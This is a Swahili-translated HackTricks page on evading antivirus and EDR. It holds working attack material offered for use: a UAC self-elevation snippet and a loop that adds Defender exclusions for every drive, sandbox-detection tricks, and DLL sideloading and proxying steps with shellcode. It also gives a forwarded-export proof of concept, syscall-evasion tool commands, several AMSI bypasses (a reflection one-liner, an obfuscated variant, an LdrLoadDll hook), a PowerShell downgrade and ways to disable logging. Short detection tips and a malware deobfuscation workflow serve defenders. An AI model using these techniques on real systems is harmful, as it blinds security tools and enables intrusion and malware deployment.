# Bypass ya Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kumzuia Defender

- [defendnot](https://github.com/es3n1n/defendnot): Tool ya kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Tool ya kuzuia Windows Defender kufanya kazi kwa kuigiza AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Ulaghai wa UAC wa mtindo wa installer kabla ya kuingilia Defender

Public loaders zinazojifanya cheats za game mara nyingi husambazwa kama installers za Node.js/Nexe ambazo hazijasainiwa, na kwanza **humwomba mtumiaji ruhusa za elevation**, kisha huizima Defender. Mtiririko huo ni rahisi:

1. Kagua ikiwa kuna administrative context kwa kutumia `net session`. Command hii hufaulu tu caller anapokuwa na admin rights, hivyo kushindwa kwake kunaonyesha kuwa loader inaendeshwa na standard user.
2. Jijizindue upya mara moja kwa kutumia verb ya `RunAs` ili kuanzisha UAC consent prompt inayotarajiwa huku ukihifadhi command line ya awali.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathiriwa tayari wanaamini kuwa wanasakinisha software “cracked”, hivyo prompt kwa kawaida hukubaliwa, na kuipa malware ruhusa inazohitaji kubadilisha policy ya Defender.

### Exclusions za `MpPreference` kwa kila drive letter

Baada ya kupata elevated privileges, chains za mtindo wa GachiLoader huongeza blind spots za Defender badala ya kuzima service moja kwa moja. Loader kwanza huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha huweka **exclusions pana kupita kiasi**, ili kila user profile, system directory, na removable disk isiweze kuchanganuliwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Loop hii hupitia kila filesystem iliyomountiwa (D:\, E:\, USB sticks, n.k.), kwa hiyo **payload yoyote ya baadaye itakayowekwa mahali popote kwenye disk itapuuzwa**.
- Uondoaji wa extension `.sys` umeandaliwa kwa matumizi ya baadaye—attackers wanahifadhi uwezekano wa kupakia unsigned drivers baadaye bila kugusa tena Defender.
- Mabadiliko yote yanawekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo stages za baadaye zinaweza kuthibitisha kuwa exclusions zinaendelea kuwepo au kuzipanua bila kusababisha UAC tena.

Kwa kuwa hakuna Defender service inayosimamishwa, health checks rahisi zitaendelea kuripoti “antivirus active” ingawa real-time inspection haigusi paths hizo.

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia methods tofauti kuchunguza kama file ni malicious au la: static detection, dynamic analysis, na kwa EDRs zilizo advanced zaidi, behavioural analysis.

### **Static detection**

Static detection hufanywa kwa ku-flag strings au arrays za bytes zinazojulikana kuwa malicious ndani ya binary au script, na pia kutoa taarifa kutoka kwenye file lenyewe (kwa mfano file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kuwa kutumia public tools zinazojulikana kunaweza kukufanya ugundulike kwa urahisi zaidi, kwa sababu huenda tayari zimechanganuliwa na ku-flagwa kuwa malicious. Kuna njia kadhaa za kukwepa aina hii ya detection:

- **Encryption**

Ukiencrypt binary, AV haitakuwa na njia ya kugundua program yako, lakini utahitaji aina fulani ya loader ya kuidecrypt na kuiendesha kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha strings kadhaa kwenye binary au script yako ili ipite AV, lakini hii inaweza kuchukua muda mwingi kulingana na unachojaribu ku-obfuscate.

- **Custom tooling**

Ukitengeneza tools zako mwenyewe, hakutakuwa na known bad signatures, lakini hii huhitaji muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya ku-check Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya file katika segments nyingi, kisha huagiza Defender i-scan kila segment moja moja; kwa njia hii, inaweza kukuonyesha strings au bytes zilizo-flagwa kwenye binary yako.

Ninapendekeza sana uangalie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) hii kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inaendesha binary yako ndani ya sandbox na kufuatilia malicious activity (kwa mfano kujaribu ku-decrypt na kusoma passwords za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kufanya nayo kazi, lakini haya ni baadhi ya mambo unayoweza kufanya ili kukwepa sandboxes.

- **Sleep before execution** Kulingana na jinsi ilivyotekelezwa, hii inaweza kuwa njia nzuri ya kupita AV's dynamic analysis. AVs huwa na muda mfupi sana wa ku-scan files ili zisiingilie workflow ya mtumiaji, kwa hiyo kutumia sleeps ndefu kunaweza kuvuruga analysis ya binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep hiyo kulingana na jinsi ilivyotekelezwa.
- **Checking machine's resources** Kwa kawaida Sandboxes huwa na resources chache sana za kutumia (kwa mfano < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya machine ya mtumiaji. Unaweza pia kuwa creative sana hapa, kwa mfano ku-check temperature ya CPU au hata fan speeds; si kila kitu kitatekelezwa kwenye sandbox.
- **Machine-specific checks** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza ku-check domain ya computer ili kuona kama inalingana na uliyoainisha; ikiwa hailingani, unaweza kufanya program yako itoke.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, kwa hiyo unaweza ku-check computer name kwenye malware yako kabla ya detonation. Jina likiwa HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Baadhi ya tips nyingine nzuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) za kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali kwenye post hii, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza swali hili:

Kwa mfano, ikiwa unataka kufanya dump ya LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project tofauti ambayo haijulikani sana na pia hufanya dump ya LSASS.

Jibu sahihi huenda likawa la pili. Tukitumia mimikatz kama mfano, huenda ni moja ya, au ikiwa siyo, ndicho kipande cha malware kilicho-flagwa zaidi na AVs na EDRs. Ingawa project yenyewe ni nzuri sana, pia ni nightmare kufanya nayo kazi ili kukwepa AVs, kwa hiyo tafuta alternatives za kile unachojaribu kufanikisha.

> [!TIP]
> Unapomodify payloads zako kwa ajili ya evasion, hakikisha **umezima automatic sample submission** kwenye Defender, na tafadhali, kwa uzito, **USIUPLOAD KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka ku-check kama payload yako inagunduliwa na AV fulani, i-install kwenye VM, jaribu kuzima automatic sample submission, kisha ifanyie test hapo hadi uridhike na matokeo.

## EXEs vs DLLs

Inapowezekana, kila mara **prioritize kutumia DLLs kwa ajili ya evasion**. Kulingana na uzoefu wangu, DLL files kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango kidogo sana**, kwa hiyo hii ni trick rahisi sana ya kuepuka detection katika baadhi ya cases (ikiwa payload yako ina njia ya ku-run kama DLL, bila shaka).

Kama tunavyoweza kuona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison ya normal Havoc EXE payload dhidi ya normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha tricks kadhaa unazoweza kutumia na DLL files ili kuwa stealthier zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia search order ya DLL inayotumiwa na loader kwa kuweka victim application na malicious payload(s) pamoja, upande kwa upande.

Unaweza ku-check programs zilizo susceptible kwa DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" pamoja na faili za DLL ambazo zinajaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu za DLL Hijackable/Sideloadable**, technique hii ni stealthy sana ikifanywa vizuri, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kugunduliwa kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa sababu programu inatarajia functions maalum ndani ya DLL hiyo. Ili kutatua tatizo hili, tutatumia technique nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** hu-forward calls ambazo programu hufanya kutoka kwenye proxy (na hasidi) DLL kwenda kwenye DLL asilia, hivyo kuhifadhi functionality ya programu na kuwezesha kushughulikia execution ya payload yako.

Nitatumia project ya [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha source code cha DLL, na DLL ya awali iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyo-encoded kwa [SGN](https://github.com/EgeBalci/sgn)) pamoja na proxy DLL zina kiwango cha Detection cha 0/26 katika [antiscan.me](https://antiscan.me)! Naweza kusema hilo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading, pamoja na [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), ili ujifunze zaidi kuhusu tulichojadili kwa kina.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, export entry huwa na ASCII string ya muundo `TargetDll.TargetFunc`. Caller anapotatua export, Windows loader itafanya yafuatayo:

- I-load `TargetDll` ikiwa bado haijawekwa kwenye memory
- I-resolve `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye protected KnownDLLs namespace (kwa mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa DLL search order hutumiwa, unaojumuisha directory ya module inayofanya forward resolution.

Hii huwezesha primitive ya indirect sideloading: tafuta signed DLL ambayo ina-export function iliyo-forward kwenye jina la module isiyo ya KnownDLL, kisha iweke signed DLL hiyo pamoja na DLL inayodhibitiwa na attacker yenye jina linalolingana kabisa na forwarded target module. Forwarded export inapo-invoked, loader hutatua forward na ku-load DLL yako kutoka directory hiyo hiyo, na kutekeleza DllMain yako.

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, kwa hivyo inatatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili system DLL iliyosainiwa kwenye folda inayoweza kuandikiwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi katika folda hiyo hiyo. DllMain ya msingi inatosha kupata utekelezaji wa code; huhitaji kutekeleza function iliyoforwardiwa ili kuchochea DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Anzisha forward kwa LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Tabia iliyozingatiwa:
- rundll32 (iliyosainiwa) inapakia `keyiso.dll` ya side-by-side (iliyosainiwa)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader inafuata forward kwenda `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuwa tayari imeendeshwa

Vidokezo vya Hunting:
- Lenga exports zilizo-forward ambapo module lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha exports zilizo-forward kwa kutumia tooling kama vile:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama inventory ya Windows 11 forwarder kutafuta candidates: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya detection/defense:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia DLLs zilizosainiwa kutoka kwenye paths zisizo za mfumo, kisha kupakia non-KnownDLLs zenye base name sawa kutoka kwenye directory hiyo
- Weka alert kwa process/module chains kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` iliyo chini ya paths zinazoweza kuandikwa na mtumiaji
- Tekeleza code integrity policies (WDAC/AppLocker) na kataza write+execute katika application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya; kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee tool moja pekee. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kupita hooks hizo, unaweza kutengeneza syscall stubs za **direct** au **indirect** zinazopakia **SSN** (System Service Number) sahihi na kufanya transition kwenda kernel mode bila kutekeleza hooked export entrypoint.

**Chaguo za invocation:**
- **Direct (embedded)**: ingiza instruction ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna kugusa `ntdll` export).
- **Indirect**: ruka kwenda kwenye `syscall` gadget iliyopo ndani ya `ntdll` ili kernel transition ionekane kana kwamba imetoka `ntdll` (ni muhimu kwa heuristic evasion); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka ku-embed static `0F 05` opcode sequence kwenye disk; tafuta syscall sequence wakati wa runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: kadiria SSNs kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma stub bytes.
- **SyscallsFromDisk**: map `\KnownDlls\ntdll.dll` iliyo safi, soma SSNs kutoka kwenye `.text` yake, kisha unmap (hupita hooks zote za in-memory).
- **RecycledGate**: changanya VA-sorted SSN inference na opcode validation wakati stub iko safi; rudi kwenye VA inference ikiwa imehookiwa.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua hooked bytes.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AVs ziliweza kuchanganua **files kwenye disk** pekee, hivyo ikiwa ungeweza kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kufanya chochote kuizuia, kwa kuwa haikuwa na visibility ya kutosha.

Kipengele cha AMSI kimeunganishwa kwenye vipengele hivi vya Windows.

- User Account Control, au UAC (elevation ya EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya interactive, na dynamic code evaluation)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Huruhusu antivirus solutions kukagua tabia ya script kwa kufichua contents za script katika hali ambayo haina encryption wala obfuscation.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha alert ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka `amsi:` mwanzoni, ikifuatiwa na path ya executable ambayo script iliendeshwa kutoka humo, katika hali hii, powershell.exe

Hatuku-drop file yoyote kwenye disk, lakini bado tulinaswa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code hupitishwa pia kupitia AMSI. Hii inaathiri hata `Assembly.Load(byte[])` kwa ajili ya kupakia execution kwenye memory. Ndiyo sababu kutumia versions za chini za .NET (kama 4.7.2 au chini) kunapendekezwa kwa execution kwenye memory ikiwa unataka ku-evade AMSI.

Kuna njia kadhaa za kupita AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa static detections, kubadilisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya ku-evade detection.

Hata hivyo, AMSI ina uwezo wa ku-unobfuscate scripts hata ikiwa zina layers nyingi, hivyo obfuscation inaweza kuwa chaguo baya kulingana na jinsi inavyofanywa. Hii hufanya ku-evade isiwe straightforward. Ingawa wakati mwingine unachohitaji kufanya ni kubadilisha majina machache ya variables na utakuwa sawa, kwa hiyo inategemea kiwango ambacho kitu kime-flagged.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL ndani ya process ya powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana ku-tamper nayo kwa urahisi hata ukiwa unatumia user asiye na privileges. Kwa sababu ya dosari hii katika implementation ya AMSI, researchers wamegundua njia nyingi za ku-evade AMSI scanning.

**Forcing an Error**

Kulazimisha AMSI initialization ishindwe (amsiInitFailed) kutasababisha scan isianzishwe kwa process ya sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imetengeneza signature ya kuzuia matumizi mapana zaidi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichohitajika ni mstari mmoja tu wa powershell code kuifanya AMSI isitumikike kwa mchakato wa sasa wa powershell. Bila shaka, mstari huu umeflag na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia technique hii.

Hii hapa ni AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka kwamba huenda hii ika-flag mara tu post hii itakapotolewa, kwa hivyo hupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki undetected.

**Memory Patching**

Technique hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta address ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuscan input iliyotolewa na user) na kuibadilisha kwa instructions za kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya scan halisi yatakuwa 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia kuna techniques nyingine nyingi zinazotumika kubypass AMSI kwa kutumia powershell; angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye process ya sasa. Bypass imara isiyofungamana na lugha ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` inayorudisha error wakati module iliyoombwa ni `amsi.dll`. Kwa sababu hiyo, AMSI haipakwi kamwe na hakuna scans zinazofanyika kwa process hiyo.

Muhtasari wa implementation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders vilevile (kitu chochote ambacho kingepakia AMSI).
- Oanisha na kupeleka scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka command-line artefacts ndefu.
- Imeonekana ikitumiwa na loaders wanaotekelezwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kubypass AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kubypass AMSI ambayo huepuka signature kwa kutumia function na variables zilizobainishwa na user kwa mpangilio wa nasibu, character expressions, na kutumia random character casing kwenye PowerShell keywords ili kuepuka signature.

**Ondoa signature iliyotambuliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa AMSI signature iliyotambuliwa kutoka kwenye memory ya process ya sasa. Tool hii hufanya kazi kwa kuchanganua memory ya process ya sasa kutafuta AMSI signature, kisha kui-overwrite kwa NOP instructions, hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni feature inayokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa attackers wanaotaka kukwepa detection**.

Ili kubypass PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia tool kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha powershell isiyo na defenses (hivi ndivyo `powerpick` kutoka Cobal Strike inavyotumika).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea ku-encrypt data, jambo litakaloongeza entropy ya binary na kurahisisha AVs na EDRs kuigundua. Kuwa mwangalifu na hili na labda tumia encryption kwenye sehemu maalum tu za code yako zilizo sensitive au zinazohitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Unapochanganua malware inayotumia ConfuserEx 2 (au commercial forks), ni kawaida kukutana na layers kadhaa za protection ambazo zitazuia decompilers na sandboxes. Workflow iliyo hapa chini hurejesha kwa uhakika **IL iliyo karibu na ya awali**, ambayo baadaye inaweza ku-decompile kuwa C# kwa kutumia tools kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx hu-encrypt kila *method body* na ku-decrypt ndani ya *module* static constructor (`<Module>.cctor`). Pia hubadilisha PE checksum, hivyo modification yoyote itasababisha binary ku-crash. Tumia **AntiTamperKiller** kutafuta encrypted metadata tables, kurejesha XOR keys na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output ina anti-tamper parameters 6 (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu unapounda unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – peleka file *safi* kwenye **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua ConfuserEx 2 profile
• de4dot itatengua control-flow flattening, kurejesha namespaces, classes na variable names za awali, na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls kuwa wrappers nyepesi (zinazojulikana kama *proxy calls*) ili kuvuruga zaidi decompilation. Ziondoe kwa kutumia **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary inayotokana na dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata *real* payload. Mara nyingi malware huihifadhi kama TLV-encoded byte array iliyoanzishwa ndani ya `<Module>.byte_0`.

Chain iliyo hapo juu hurejesha execution flow **bila kuhitaji kuendesha malicious sample** – jambo muhimu unapofanya kazi kwenye offline workstation.

